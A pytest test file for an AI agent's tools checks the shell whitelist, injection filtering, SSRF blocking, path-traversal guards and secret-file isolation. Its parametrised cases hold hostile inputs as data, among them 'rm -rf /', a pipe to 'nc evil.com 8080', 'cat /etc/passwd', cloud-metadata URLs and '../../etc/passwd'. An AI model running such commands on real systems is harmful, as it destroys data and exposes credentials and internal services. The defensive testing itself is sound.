"""
Tests for Agent Tools
======================
- search_knowledge_base
- parse_log_content
- get_runtime_logs
- get_system_status
- run_shell_command
- read_code_file
- list_directory
- check_api_health
"""
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from backend.agent.tools import (
    check_api_health,
    get_runtime_logs,
    get_system_status,
    list_directory,
    parse_log_content,
    read_code_file,
    run_shell_command,
    search_knowledge_base,
)
from tests.conftest import (
    SAMPLE_LOG_NO_ERROR,
    SAMPLE_LOG_PLAIN,
    SAMPLE_LOG_WITH_TRACEBACK,
    SAMPLE_RUNTIME_LOG_LINES,
)

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent


class TestSearchKnowledgeBase:
    """知识库检索工具测试"""

    def test_search_with_results(self, mock_retriever):
        """知识库中有匹配结果时应返回格式化的文档摘要"""
        with patch("backend.api.deps.get_rag_pipeline") as mock_get:
            pipe = MagicMock()
            pipe.retriever = mock_retriever
            mock_get.return_value = pipe

            result = search_knowledge_base.invoke({"query": "登录超时"})

            assert "登录超时" in result or "[文档" in result

    def test_search_no_results(self, mock_retriever):
        """知识库中无结果时应返回提示"""
        mock_retriever.similarity_search.side_effect = None
        mock_retriever.similarity_search.return_value = []

        with patch("backend.api.deps.get_rag_pipeline") as mock_get:
            pipe = MagicMock()
            pipe.retriever = mock_retriever
            mock_get.return_value = pipe

            result = search_knowledge_base.invoke({"query": "不存在的关键词"})

            assert "未找到相关内容" in result


class TestParseLogContent:
    """日志解析工具测试"""

    def test_parse_traceback_log(self):
        """包含 Traceback 的日志应提取异常信息"""
        with patch("backend.api.deps.get_log_analyzer") as mock_get:
            from backend.models.analysis import ExceptionInfo

            analyzer = MagicMock()
            analyzer._extract_exceptions.return_value = [
                ExceptionInfo(exception_type="TimeoutException", message="Timed out waiting for element"),
            ]
            mock_get.return_value = analyzer

            result = parse_log_content.invoke({"log_text": SAMPLE_LOG_WITH_TRACEBACK})

            assert "TimeoutException" in result
            assert "1 个异常" in result

    def test_parse_plain_log(self):
        """包含异常关键词的非 Traceback 日志"""
        with patch("backend.api.deps.get_log_analyzer") as mock_get:
            from backend.models.analysis import ExceptionInfo

            analyzer = MagicMock()
            analyzer._extract_exceptions.return_value = [
                ExceptionInfo(exception_type="TimeoutException", message="Timed out waiting for element"),
            ]
            mock_get.return_value = analyzer

            result = parse_log_content.invoke({"log_text": SAMPLE_LOG_PLAIN})

            assert "TimeoutException" in result

    def test_parse_no_error_log(self):
        """无异常的日志应提示未检测到异常"""
        with patch("backend.api.deps.get_log_analyzer") as mock_get:
            analyzer = MagicMock()
            analyzer._extract_exceptions.return_value = []
            mock_get.return_value = analyzer

            result = parse_log_content.invoke({"log_text": SAMPLE_LOG_NO_ERROR})

            assert "未在日志中检测到" in result or "未检测到已知异常" in result


class TestGetRuntimeLogs:
    """运行日志读取工具测试"""

    def test_read_all_levels(self, mock_settings, tmp_path):
        """读取全部级别的日志"""
        log_dir = tmp_path / "logs"
        log_dir.mkdir()
        log_file = log_dir / "app.log"
        log_file.write_text("".join(SAMPLE_RUNTIME_LOG_LINES), encoding="utf-8")

        # LOG_DIR 为真实字段，get_log_dir() 会优先返回它
        with patch("backend.config.settings.get_settings") as mock_get:
            mock_settings.LOG_DIR = str(log_dir)
            mock_get.return_value = mock_settings

            result = get_runtime_logs.invoke({"tail_lines": 200, "level": "all"})

        assert "Server started" in result
        assert "ConnectionError" in result

    def test_read_error_only(self, mock_settings, tmp_path):
        """按 ERROR 级别过滤"""
        log_dir = tmp_path / "logs"
        log_dir.mkdir()
        log_file = log_dir / "app.log"
        log_file.write_text("".join(SAMPLE_RUNTIME_LOG_LINES), encoding="utf-8")

        with patch("backend.config.settings.get_settings") as mock_get:
            mock_settings.LOG_DIR = str(log_dir)
            mock_get.return_value = mock_settings

            result = get_runtime_logs.invoke({"tail_lines": 200, "level": "ERROR"})

        assert "ConnectionError" in result
        assert "Health check OK" not in result

    def test_log_file_not_exists(self, mock_settings):
        """日志文件不存在时返回提示"""
        with patch("backend.config.settings.get_settings") as mock_get:
            mock_settings.LOG_DIR = "/nonexistent/path"
            mock_get.return_value = mock_settings

            result = get_runtime_logs.invoke({"tail_lines": 200, "level": "all"})

        assert "不存在" in result or "空" in result

    def test_limit_tail_lines(self, mock_settings, tmp_path):
        """tail_lines 参数应限制返回行数"""
        log_dir = tmp_path / "logs"
        log_dir.mkdir()
        log_file = log_dir / "app.log"
        lines = [f"2024-01-15 | INFO | test:{i} | line {i}\n" for i in range(100)]
        log_file.write_text("".join(lines), encoding="utf-8")

        with patch("backend.config.settings.get_settings") as mock_get:
            mock_settings.LOG_DIR = str(log_dir)
            mock_get.return_value = mock_settings

            result = get_runtime_logs.invoke({"tail_lines": 10, "level": "all"})

        line_count = len(result.strip().split("\n"))
        assert line_count <= 11  # 可能包含一些空格行


class TestGetSystemStatus:
    """系统状态诊断工具测试"""

    def test_all_components_configured(self, mock_settings):
        """所有组件配置正确时状态报告应包含对应条目"""
        with patch("backend.selenium_driver.driver.detect_chrome") as mock_detect, \
             patch("backend.api.deps.get_rag_pipeline") as mock_pipe, \
             patch("backend.selenium_driver.driver._get_chromedriver_major_version") as mock_drv_ver, \
             patch("backend.selenium_driver.driver._get_chrome_major_version") as mock_chr_ver:

            mock_detect.return_value = ("C:/chrome.exe", "C:/chromedriver.exe")
            mock_drv_ver.return_value = 146
            mock_chr_ver.return_value = 146
            pipe = MagicMock()
            pipe.vector_store.count.return_value = 42
            mock_pipe.return_value = pipe

            result = get_system_status.invoke({})

            assert "DashScope" in result
            assert "Chrome" in result
            assert "chromedriver" in result
            assert "Chroma" in result

    def test_llm_not_configured(self, mock_settings):
        """LLM 未配置时应提示"""
        mock_settings.DASHSCOPE_API_KEY = ""

        with patch("backend.selenium_driver.driver.detect_chrome") as mock_detect, \
             patch("backend.api.deps.get_rag_pipeline") as mock_pipe:

            mock_detect.return_value = ("", "")
            pipe = MagicMock()
            pipe.vector_store.count.return_value = 0
            mock_pipe.return_value = pipe

            result = get_system_status.invoke({})

            assert "未配置" in result

    def test_chrome_not_found(self, mock_settings):
        """Chrome 未找到时应提示"""
        with patch("backend.selenium_driver.driver.detect_chrome") as mock_detect, \
             patch("backend.api.deps.get_rag_pipeline") as mock_pipe, \
             patch("backend.selenium_driver.driver._get_chromedriver_major_version", return_value=None), \
             patch("backend.selenium_driver.driver._get_chrome_major_version", return_value=None):

            mock_detect.return_value = ("", "")
            pipe = MagicMock()
            pipe.vector_store.count.return_value = 0
            mock_pipe.return_value = pipe

            result = get_system_status.invoke({})

            assert "未找到" in result


class TestRunShellCommand:
    """Shell 命令执行工具测试（含命令注入防护）"""

    @pytest.mark.parametrize("command", [
        "python --version",
        "git status",
        "git log --oneline -n 5",
        "git diff --stat",
    ])
    def test_allowed_command(self, command):
        """白名单内的命令应允许执行"""
        result = run_shell_command.invoke({"command": command})
        # 不应返回拒绝或错误信息
        assert "不在白名单内" not in result
        assert "非法字符" not in result

    @pytest.mark.parametrize("command", [
        "rm -rf /",
        "del /F /S *.*",
        "curl http://evil.com",
        "format C:",
        "find . -exec rm {} \\;",
    ])
    def test_disallowed_command(self, command):
        """白名单外的命令应拒绝"""
        result = run_shell_command.invoke({"command": command})
        assert "不在白名单内" in result or "非法字符" in result

    @pytest.mark.parametrize("command", [
        "python --version && rm -rf data",
        "git status; cat /etc/passwd",
        "python -m pytest | nc evil.com 8080",
        "git log --oneline -n 5 > /tmp/leak.txt",
        "python --version `whoami`",
        "git status $HOME",
    ])
    def test_command_injection_blocked(self, command):
        """命令注入攻击应被拦截（shell 元字符检测）"""
        result = run_shell_command.invoke({"command": command})
        # 必须被拒绝，不能执行
        assert "非法字符" in result or "不在白名单内" in result

    def test_empty_command(self):
        """空命令应拒绝"""
        result = run_shell_command.invoke({"command": ""})
        assert "空命令" in result

    def test_shell_false_used(self):
        """验证使用 shell=False（不通过 shell 解释器执行）"""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(stdout="ok", stderr="")
            run_shell_command.invoke({"command": "python --version"})
            # 验证 shell=False
            _, kwargs = mock_run.call_args
            assert kwargs.get("shell") is False


class TestCheckApiHealth:
    """API 健康检查工具测试（含 SSRF 防护）"""

    def test_api_available(self):
        """可用的 API 应返回状态码（公网地址）"""

        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = '{"status": "ok"}'

        # mock socket.gethostbyname 返回公网 IP，绕过 SSRF 检查
        with patch("socket.gethostbyname", return_value="93.184.216.34"), \
             patch("requests.get", return_value=mock_resp) as mock_get:
            result = check_api_health.invoke({"url": "https://example.com/health"})

            assert "可用" in result
            assert "200" in result
            mock_get.assert_called_once()

    def test_api_connection_error(self):
        """连接失败应返回错误提示（公网地址）"""
        import requests

        with patch("socket.gethostbyname", return_value="93.184.216.34"), \
             patch("requests.get", side_effect=requests.ConnectionError("Connection refused")):
            result = check_api_health.invoke({"url": "https://example.com/health"})

            assert "无法连接" in result

    def test_api_timeout(self):
        """超时应返回超时提示（公网地址）"""
        import requests

        with patch("socket.gethostbyname", return_value="93.184.216.34"), \
             patch("requests.get", side_effect=requests.Timeout("Timed out")):
            result = check_api_health.invoke({"url": "https://slow-server.com"})

            assert "超时" in result

    @pytest.mark.parametrize("url", [
        "http://127.0.0.1:8000/admin",
        "http://localhost:8000/health",
        "http://169.254.169.254/latest/meta-data/",  # 云元数据
        "http://10.0.0.1/internal-api",
        "http://192.168.1.1/admin",
    ])
    def test_ssrf_blocked(self, url):
        """SSRF 攻击应被拦截（内网/回环/链路本地地址）"""
        result = check_api_health.invoke({"url": url})
        assert "不在允许范围内" in result or "私有地址" in result or "回环地址" in result \
            or "链路本地" in result or "保留地址" in result

    def test_invalid_scheme_blocked(self):
        """非 http/https 协议应被拒绝"""
        result = check_api_health.invoke({"url": "file:///etc/passwd"})
        assert "不在允许范围内" in result or "协议" in result

    def test_no_redirect(self):
        """验证禁用重定向（防 SSRF 重定向绕过）"""

        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "ok"

        with patch("socket.gethostbyname", return_value="93.184.216.34"), \
             patch("requests.get", return_value=mock_resp) as mock_get:
            check_api_health.invoke({"url": "https://example.com/health"})
            _, kwargs = mock_get.call_args
            assert kwargs.get("allow_redirects") is False


class TestReadCodeFile:
    """代码读取工具测试"""

    def test_read_existing_file(self, tmp_path):
        """读取存在的文件应返回内容"""
        test_file = tmp_path / "test.py"
        test_file.write_text("print('hello')\nprint('world')\n", encoding="utf-8")

        with patch("backend.config.settings.PROJECT_ROOT", tmp_path):
            result = read_code_file.invoke({"file_path": "test.py"})

            assert "hello" in result
            assert "world" in result

    def test_read_nonexistent_file(self, tmp_path):
        """读取不存在的文件应返回错误"""
        with patch("backend.config.settings.PROJECT_ROOT", tmp_path):
            result = read_code_file.invoke({"file_path": "nonexistent.py"})

            assert "不存在" in result

    def test_path_traversal_blocked(self, tmp_path):
        """路径穿越攻击应被阻止"""
        with patch("backend.config.settings.PROJECT_ROOT", tmp_path):
            result = read_code_file.invoke({"file_path": "../../etc/passwd"})

            assert "只能读取" in result


class TestListDirectory:
    """目录列表工具测试"""

    def test_list_root_directory(self, tmp_path):
        """列出项目根目录"""
        (tmp_path / "README.md").write_text("")
        (tmp_path / "src").mkdir()
        (tmp_path / "tests").mkdir()

        with patch("backend.config.settings.PROJECT_ROOT", tmp_path):
            result = list_directory.invoke({"dir_path": ""})

            assert "README.md" in result

    def test_list_nonexistent_dir(self, tmp_path):
        """列出不存在的目录应返回错误"""
        with patch("backend.config.settings.PROJECT_ROOT", tmp_path):
            result = list_directory.invoke({"dir_path": "nonexistent"})

            assert "不存在" in result

    def test_path_traversal_blocked(self, tmp_path):
        """路径穿越攻击应被阻止"""
        with patch("backend.config.settings.PROJECT_ROOT", tmp_path):
            result = list_directory.invoke({"dir_path": "../../windows"})

            assert "只能访问" in result


# ==================================================================
# 安全收口回归测试（2026-08-23）
# 覆盖：密钥文件隔离 / shell 白名单 pip 修复 / 浏览器工具 SSRF
# ==================================================================

class TestReadCodeFileSecurity:
    """read_code_file 密钥隔离测试（防止 API Key 泄露给 LLM）"""

    def test_env_file_blocked(self, tmp_path):
        """.env 文件必须拒绝读取（含真实 API Key）"""
        (tmp_path / ".env").write_text(
            "DASHSCOPE_API_KEY=sk-real-secret-key\n", encoding="utf-8"
        )
        with patch("backend.config.settings.PROJECT_ROOT", tmp_path):
            result = read_code_file.invoke({"file_path": ".env"})
            assert "敏感文件" in result
            assert "sk-real-secret-key" not in result

    def test_env_example_allowed(self, tmp_path):
        """.env.example 是模板（不含真实密钥）应放行（P2-3 修复）

        拒绝 .env 时提示"请读取 .env.example"，该文件必须真的可读，
        否则错误提示自相矛盾。
        """
        (tmp_path / ".env.example").write_text(
            "DASHSCOPE_API_KEY=\n", encoding="utf-8"
        )
        with patch("backend.config.settings.PROJECT_ROOT", tmp_path):
            result = read_code_file.invoke({"file_path": ".env.example"})
            assert "敏感文件" not in result
            assert "DASHSCOPE_API_KEY" in result

    @pytest.mark.parametrize("filename", [
        ".env.local",
        ".env.production",
        "id_rsa",
        "server.pem",
        "credentials.yml.key",
    ])
    def test_sensitive_files_blocked(self, tmp_path, filename):
        """敏感文件变体（.env.* / 私钥 / 证书）都应拒绝"""
        (tmp_path / filename).write_text("secret", encoding="utf-8")
        with patch("backend.config.settings.PROJECT_ROOT", tmp_path):
            result = read_code_file.invoke({"file_path": filename})
            assert "敏感文件" in result

    def test_unknown_extension_blocked(self, tmp_path):
        """白名单外的扩展名应拒绝（如 .exe / 无扩展名）"""
        (tmp_path / "binary.exe").write_text("MZ...", encoding="utf-8")
        (tmp_path / "noext").write_text("data", encoding="utf-8")
        with patch("backend.config.settings.PROJECT_ROOT", tmp_path):
            assert "不支持读取" in read_code_file.invoke({"file_path": "binary.exe"})
            assert "不支持读取" in read_code_file.invoke({"file_path": "noext"})

    def test_normal_code_file_allowed(self, tmp_path):
        """普通代码文件（.py）应正常读取"""
        (tmp_path / "app.py").write_text("print('ok')\n", encoding="utf-8")
        with patch("backend.config.settings.PROJECT_ROOT", tmp_path):
            result = read_code_file.invoke({"file_path": "app.py"})
            assert "ok" in result
            assert "敏感文件" not in result


class TestShellWhitelistPipFix:
    """shell 白名单 pip 元组 bug 修复验证

    原缺陷：校验键固定取 args[:3]，而 pip 白名单条目是 4 元组，
    导致 `python -m pip list/show` 永远被拒绝。
    """

    @pytest.mark.parametrize("command", [
        "python -m pip list",
        "python -m pip show requests",
    ])
    def test_pip_commands_now_allowed(self, command):
        """修复后 pip list/show 应放行"""
        result = run_shell_command.invoke({"command": command})
        assert "不在白名单内" not in result
        assert "非法字符" not in result

    @pytest.mark.parametrize("command", [
        "python -m pip install requests",      # 安装任意包（供应链攻击面）
        "python -m pip download evil-package",
        "python -m pip uninstall requests",
        "python -m evil_module",
    ])
    def test_pip_dangerous_subcommands_still_blocked(self, command):
        """pip install/download/uninstall 等危险子命令仍应拒绝"""
        result = run_shell_command.invoke({"command": command})
        assert "不在白名单内" in result or "非法字符" in result

    def test_pytest_with_extra_args_allowed(self):
        """pytest 允许追加参数（前缀匹配语义）"""
        result = run_shell_command.invoke({"command": "python -m pytest tests/ -v --co"})
        assert "不在白名单内" not in result
        assert "非法字符" not in result


class TestBrowserToolsSSRF:
    """浏览器工具 SSRF 防护测试（explore_website / run_custom_test / run_real_test_scenario）"""

    @pytest.mark.parametrize("url", [
        "http://169.254.169.254/latest/meta-data/",  # 云元数据
        "http://10.0.0.1/internal",
        "http://127.0.0.1:8000/admin",
        "http://localhost:8080/console",
    ])
    def test_explore_website_ssrf_blocked(self, url):
        """explore_website 应拒绝内网/回环/云元数据地址"""
        from backend.agent.tools import explore_website
        result = explore_website.invoke({"url": url})
        assert "不在允许范围内" in result
        # 不应尝试启动浏览器（拒绝发生在 WebDriverManager 创建之前）
        assert "网站探索失败" not in result

    def test_run_custom_test_ssrf_blocked(self):
        """run_custom_test 主 URL 为内网地址应拒绝"""
        import json

        from backend.agent.tools import run_custom_test
        steps = json.dumps([{"action": "navigate", "value": "http://10.0.0.1/admin"}])
        result = run_custom_test.invoke({"url": "http://10.0.0.1/", "steps": steps})
        assert "不在允许范围内" in result

    def test_run_custom_test_navigate_bypass_blocked(self):
        """navigate 步骤携带内网 URL 应被拦截（防绕过主 URL 检查）"""
        import ipaddress
        import json
        from unittest.mock import patch as _patch

        from backend.agent.tools import run_custom_test
        steps = json.dumps([
            {"action": "navigate", "value": "http://169.254.169.254/latest/meta-data/"}
        ])

        # mock DNS：域名一律解析为公网 IP；字面 IP 原样返回（模拟真实解析行为）
        def fake_resolve(host):
            try:
                ipaddress.ip_address(host)
                return host
            except ValueError:
                return "93.184.216.34"

        with _patch("socket.gethostbyname", side_effect=fake_resolve):
            result = run_custom_test.invoke({"url": "https://example.com/", "steps": steps})
        assert "不在允许范围内" in result

    @pytest.mark.parametrize("base_url", [
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.1/internal",
        "http://192.168.1.1/admin",
    ])
    def test_run_real_test_ssrf_blocked(self, base_url):
        """run_real_test_scenario 应拒绝非回环内网地址（云元数据/局域网）"""
        from backend.agent.tools import run_real_test_scenario
        result = run_real_test_scenario.invoke({"scenario": "login", "base_url": base_url})
        assert "不在允许范围内" in result

    def test_run_real_test_loopback_allowed(self):
        """run_real_test_scenario 应放行回环地址（设计用途：测试本地被测系统）"""
        from backend.agent.tools import run_real_test_scenario

        # mock executor 返回值（格式化代码所需字段）
        fake_result = MagicMock()
        fake_result.scenario = "login"
        fake_result.status = "passed"
        fake_result.duration_ms = 100.0
        fake_result.error_message = ""
        fake_result.selenium_logs = ""
        fake_result.steps = []

        with patch("backend.api.deps.get_test_executor") as mock_get:
            executor = MagicMock()
            executor.run_single_scenario.return_value = fake_result
            mock_get.return_value = executor
            result = run_real_test_scenario.invoke({
                "scenario": "login",
                "base_url": "http://localhost:8000/demo",
            })
        # 应通过 SSRF 检查并进入执行（mock executor 返回成功）
        assert "不在允许范围内" not in result
        mock_get.return_value.run_single_scenario.assert_called_once()


class TestRunCustomTestSandbox:
    """回归：run_custom_test 的 sandbox 参数应透传到 TestRunRequest。

    事故背景（2026-08-23 app.log 8c57f5f1）：sandbox 曾硬编码 True，
    用户要求"可见测试"（真实浏览器）但实际走了沙盒 mock，浏览器从未
    执行真正的登录+搜索步骤。修复：sandbox 作为工具参数透传，默认 False。
    """

    # 局部 import json（与文件内其他测试风格一致）
    import json as _json_mod
    STEPS = _json_mod.dumps([
        {"action": "navigate", "value": "https://example.com/"},
    ])

    @staticmethod
    def _fake_result():
        fake_result = MagicMock()
        fake_result.scenario = "custom"
        fake_result.status = "passed"
        fake_result.duration_ms = 100.0
        fake_result.selenium_logs = ""
        fake_result.steps = []
        return fake_result

    def _run(self, extra_args):
        from backend.agent.tools import run_custom_test

        with patch("backend.api.deps.get_test_executor") as mock_get:
            executor = MagicMock()
            executor.run_custom_scenario.return_value = self._fake_result()
            mock_get.return_value = executor
            result = run_custom_test.invoke({
                "url": "https://example.com/",
                "steps": self.STEPS,
                **extra_args,
            })
        request = executor.run_custom_scenario.call_args[0][1]
        return result, request

    def test_sandbox_defaults_to_real_browser(self):
        """不传 sandbox 时默认 False（真实浏览器），不再硬编码沙盒"""
        result, request = self._run({})
        assert "不在允许范围内" not in result
        assert request.sandbox is False

    def test_sandbox_true_passthrough(self):
        """显式传 sandbox=True 时透传（沙盒模式可选）"""
        result, request = self._run({"sandbox": True})
        assert "不在允许范围内" not in result
        assert request.sandbox is True
